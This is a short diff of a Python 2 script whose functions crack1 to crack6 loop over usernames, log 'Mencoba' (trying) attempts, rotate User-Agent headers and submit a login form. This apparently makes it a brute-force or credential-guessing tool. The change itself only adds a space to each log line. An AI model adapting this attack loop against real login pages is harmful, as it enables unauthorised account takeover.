@@ -93,7 +93,7 @@ def crack1(ival):
     for us in ival:
       try:
         w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
-        print w + " [1] | Mencoba ==> " + us
+        print ' ' + w + " [1] | Mencoba ==> " + us
         dev.addheaders = [('User_agent', random.choice(user_agents))]
         url = dev.open(lol)
         dev.select_form(nr = 0)
@@ -122,7 +122,7 @@ def crack2(iqbal):
     for user in iqbal:
       try:
         w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
-        print w + ' [2] | Mencoba ==> ' + user
+        print ' ' + w + ' [2] | Mencoba ==> ' + user
         dev.addheaders = [('User_agent', random.choice(user_agents))]
         url = dev.open(lol)
         dev.select_form(nr = 0)
@@ -148,7 +148,7 @@ def crack3(dev_id):
     for user3 in dev_id:
         try:
             w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
-            print w + ' [3] | Mencoba ==> ' + user3
+            print ' ' + w + ' [3] | Mencoba ==> ' + user3
             dev.addheaders = [('User_agent', random.choice(user_agents))]
             url = dev.open(lol)
             dev.select_form(nr = 0)
@@ -180,7 +180,7 @@ def crack4(ival1):
     for us1 in ival1:
       try:
         w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
-        print w + " [4] | Mencoba ==> " + us1
+        print ' ' + w + " [4] | Mencoba ==> " + us1
         dev.addheaders = [('User_agent', random.choice(user_agents))]
         url = dev.open(lol)
         dev.select_form(nr = 0)
@@ -209,7 +209,7 @@ def crack5(iqbal2):
     for user2 in iqbal2:
       try:
         w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
-        print w + ' [5] | Mencoba ==> ' + user2
+        print ' ' + w + ' [5] | Mencoba ==> ' + user2
         dev.addheaders = [('User_agent', random.choice(user_agents))]
         url = dev.open(lol)
         dev.select_form(nr = 0)
@@ -235,7 +235,7 @@ def crack6(dev_id3):
     for user6 in dev_id3:
         try:
             w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
-            print w + ' [6] | Mencoba ==> ' + user6
+            print ' ' + w + ' [6] | Mencoba ==> ' + user6
             dev.addheaders = [('User_agent', random.choice(user_agents))]
             url = dev.open(lol)
             dev.select_form(nr = 0)
